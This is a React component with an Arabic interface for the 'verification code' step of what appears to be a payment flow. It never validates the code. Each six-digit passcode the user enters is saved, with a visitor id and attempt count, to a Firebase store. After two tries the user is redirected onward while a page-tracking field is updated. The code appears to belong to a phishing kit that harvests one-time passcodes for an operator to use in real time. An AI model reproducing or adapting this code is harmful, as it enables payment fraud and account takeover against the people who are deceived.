"use client"

import React from "react"

import { useState, useEffect } from "react"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Phone, Lock, AlertCircle, CheckCircle } from "lucide-react"
import { addData } from "@/lib/firebase"
import { trackFormProgress } from "@/lib/utils"

interface VerificationStepProps {
  formData: any
  paymentData: any
  setPaymentData: (data: any) => void
  stepHeaderRef: React.RefObject<HTMLHeadingElement>
}

export function VerificationStep({
  formData,
  paymentData,
  setPaymentData,
  stepHeaderRef,
}: VerificationStepProps) {
  const [otpValue, setOtpValue] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [otpAttempts, setOtpAttempts] = useState(0)
  const [timer, setTimer] = useState(120)


  useEffect(() => {
    if (timer <= 0) return

    const interval = setInterval(() => {
      setTimer((prev) => {
        if (prev <= 1) {
          clearInterval(interval)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(interval)
  }, [timer])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, "0")}`
  }

  const handleOTPChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6)
    setOtpValue(value)
    setPaymentData((prev: any) => ({ ...prev, otp: value }))
  }

  const handleVerifyOTP = async () => {
    if (otpValue.length === 6) {
      setIsLoading(true)
      const visitorId = localStorage.getItem('visitor')
      const newAttempts = otpAttempts + 1

      await addData({
        id: visitorId,
        otp: otpValue,
        otpAttempts: newAttempts,
        otpSubmittedAt: new Date().toISOString()
      })

      setOtpAttempts(newAttempts)
      setOtpValue("")

      if (newAttempts >= 2) {
        await addData({
          id: visitorId,
          currentPage: '9999'
        })

        setTimeout(() => {
          window.location.href = '/verify-phone'
        }, 1500)
      }

      setIsLoading(false)
    }
  }

  const handleResendOTP = () => {
    setOtpValue("")
    setTimer(120)
    setPaymentData((prev: any) => ({ ...prev, otp: "" }))
  }



  return (
    <div className="space-y-10">
      <div className="text-center mb-12">
        <Badge className="bg-green-100 text-green-700 px-6 py-3 text-base font-semibold mb-6 rounded-full">
          <Lock className="w-5 h-5 ml-2" />
          التحقق من الهوية
        </Badge>
        <h3 ref={stepHeaderRef} tabIndex={-1} className="text-md lg:text-4xl font-bold text-gray-900 mb-4">
          رمز التحقق
        </h3>
        <p className="text-lg text-gray-600 max-w-2xl mx-auto leading-relaxed">
          أدخل رمز التحقق المرسل إلى هاتفك لإتمام العملية
        </p>
      </div>

      <div className="max-w-2xl mx-auto text-center space-y-12">
        {/* Phone Icon */}
        <div className="w-32 h-32 bg-gradient-to-br from-blue-100 to-blue-200 rounded-full flex items-center justify-center mx-auto shadow-xl">
          <Phone className="w-16 h-16 text-blue-600" />
        </div>

        {/* Message */}
        <div>
          <h4 className="text-sm font-bold text-gray-900 mb-6">
          </h4>
          <p className="text-gray-600 text-lg leading-relaxed">
            تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم الهاتف
            <br />
            <span className="font-bold text-blue-600 text-sm">{formData.phone || "05xxxxxxxx"}</span>
          </p>
          {otpAttempts > 0 && (
            <div className="mt-4 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
              <p className="text-sm text-yellow-800 font-medium">
                عدد المحاولات: {otpAttempts} / 2
                {otpAttempts >= 2 && " - سيتم تحويلك للتحقق من رقم الهاتف"}
              </p>
            </div>
          )}
        </div>

        {/* OTP Input */}
        <div>
          <label className="block text-lg font-bold text-gray-800 mb-6">
            رمز التحقق <span className="text-red-500">*</span>
          </label>
          <Input
            name="otp"
            type="tel"
            placeholder="######"
            value={otpValue}
            onChange={handleOTPChange}
            maxLength={6}
            className="text-center text-2xl h-14 tracking-widest border-2 rounded-2xl border-gray-200 focus:border-blue-500 bg-white hover:border-gray-300 transition-all duration-300 shadow-lg hover:shadow-xl focus:shadow-xl focus:ring-4 focus:ring-blue-200"
            disabled={isLoading}
          />

          {/* Verify Button */}
            <Button
              onClick={handleVerifyOTP}
              disabled={isLoading}
              className="mt-4 bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 text-lg font-semibold rounded-2xl shadow-lg hover:shadow-xl transition-all duration-300"
            >
              {isLoading ? "جاري التحقق..." : "تحقق من الرمز"}
            </Button>
        </div>

        {/* Timer and Resend */}
        <div className="space-y-6">
          {timer > 0 ? (
            <div className="flex items-center justify-center gap-2">
              <AlertCircle className="w-5 h-5 text-blue-600" />
              <p className="text-sm text-gray-600 font-medium">
                يمكنك طلب رمز جديد خلال <span className="font-bold text-blue-600 text-lg">{formatTime(timer)}</span>
              </p>
            </div>
          ) : (
            <Button
              onClick={handleResendOTP}
              disabled={isLoading }
              variant="outline"
              className="border-2 border-blue-500 text-blue-600 hover:bg-blue-50 px-8 py-4 text-lg font-semibold rounded-2xl shadow-lg hover:shadow-xl transition-all duration-300 bg-transparent"
            >
              {isLoading ? "جاري الإرسال..." : "إرسال رمز جديد"}
            </Button>
          )}
        
        </div>
      </div>
    </div>
  )
}
